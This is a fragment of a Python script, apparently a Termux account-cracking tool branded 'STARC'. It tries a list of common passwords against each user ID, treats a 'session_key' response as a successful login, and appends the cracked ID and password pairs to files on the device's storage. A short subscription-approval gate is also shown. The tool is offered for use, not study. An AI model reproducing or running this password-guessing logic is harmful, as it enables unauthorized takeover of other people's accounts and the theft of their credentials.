    ...
    try:
        ...
        for pw in ["57273200","123456789","1234567","12345678","123456","first@last"]:
            ...
            if "session_key" in rp:
                ...
                print(f"\r\r{G}SUCCESSFUL  {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/STARC-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{G}STARC❤️-OK {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/STARC❤️-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
...
def Subscraption():
	...
	if key1 in r1:
		...
		print(logo)
		print ("")
		print(" \033[1;32m STARC Toll Free BUT You Need Get Approved First\033[1;37m\n")
